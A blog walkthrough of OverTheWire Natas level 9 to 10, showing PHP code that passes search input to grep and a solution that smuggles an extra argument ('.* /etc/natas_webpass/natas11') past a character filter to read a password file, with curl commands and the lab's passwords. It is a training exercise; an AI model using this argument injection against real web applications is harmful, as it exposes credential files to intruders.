---
layout: post-with-comments
title: "OverTheWire Natas Level 9 → 10 tutorial!!"
permalink: /posts/overTheWire-Natas-Level-9-to-10/
tags: [overthewire, natas, walkthrough, ctf, web, beginner]
description: "A step by step tutorial for OverTheWire Natas Level 9 → 10!!"
---

<!-- Scoped styles: only affect this post -->

<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
  code{white-space:pre-wrap}
</style>

<nav class="bandit-nav" aria-label="Natas level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Natas-Level-8-to-9/' | relative_url }}">← Previous: Level 8 → 9</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/natas/natas10.html" target="_blank" rel="noopener">
      Official (Level 10) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Natas-Level-10-to-11/' | relative_url }}">
      Next: Level 10 → 11 →
    </a>
  </div>
</nav>

## Login

URL: [http://natas10.natas.labs.overthewire.org](http://natas10.natas.labs.overthewire.org)  
Credentials: **natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu**

```bash
# Using curl (optional):
curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu http://natas10.natas.labs.overthewire.org/
````

![homepage]({{ '/assets/images/natas/level-9-to-10/homepage.jpg' | relative_url }})

## Task

The page provides a **search box** again. But unlike level 9, it restricts some characters.

## A little bit of Theory

From the source (`index-source.html`):

```php
<?php
$key = "";
if (array_key_exists("needle", $_REQUEST)) {
  $key = $_REQUEST["needle"];
}
if ($key != "") {
  if (preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
  } else {
    passthru("grep -i $key dictionary.txt");
  }
}
```

* Characters `;`, `|`, `&` are **blocked**.
* But we can still exploit **grep** with regex.
* Trick: use `.*` (regex wildcard) before the file path → grep will print the file contents.

**Further reading:**

* <a href="https://www.php.net/manual/en/function.preg-match.php" target="_blank" rel="noopener">PHP: `preg_match`</a>
* <a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank" rel="noopener">OWASP: Command Injection</a>

## Solution

1. **Inspect the code** and notice blocked symbols but not filenames.

   ![source]({{ '/assets/images/natas/level-9-to-10/code.jpg' | relative_url }})

2. **Exploit grep with regex**:

   In the search field, enter:

   ```
   .* /etc/natas_webpass/natas11
   ```

   Or with curl:

   ```bash
   curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu \
     --data-urlencode 'needle=.* /etc/natas_webpass/natas11' \
     http://natas10.natas.labs.overthewire.org/
   ```

3. **Read the output**: the password file is echoed directly.

   ![success]({{ '/assets/images/natas/level-9-to-10/success.jpg' | relative_url }})

## Password

```
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```

**Troubleshooting**

* Got “illegal character” message? → Avoid `;`, `|`, `&`. Stick to regex tricks.
* Still seeing empty results? → Make sure you prepend `.*` (it matches everything).
* Curl not working? → Add `--data-urlencode` to properly encode special chars.

---

**Nice 🎉** You bypassed the filter by using grep regex and dumped the next password. Onward to **natas11**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})


